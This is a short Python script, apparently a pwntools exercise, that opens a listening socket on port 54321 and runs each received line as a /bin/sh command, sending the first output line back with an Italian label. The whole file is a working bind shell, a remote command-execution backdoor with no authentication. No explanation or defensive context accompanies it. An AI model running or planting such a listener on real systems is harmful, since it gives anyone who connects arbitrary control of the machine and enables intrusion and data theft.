import pwn 

l = pwn.listen(54321)
conn = l.wait_for_connection()

while True:
    line = conn.recv().decode('utf-8')
    if line:
        sh = pwn.process("/bin/sh")
        str_cmd = f"{line}"
        sh.sendline(str_cmd.encode("utf-8"))
        out1 = sh.recvline()
        conn.send(f"Esito comando: {out1}".encode("utf-8")) 
        sh.close()       
        
    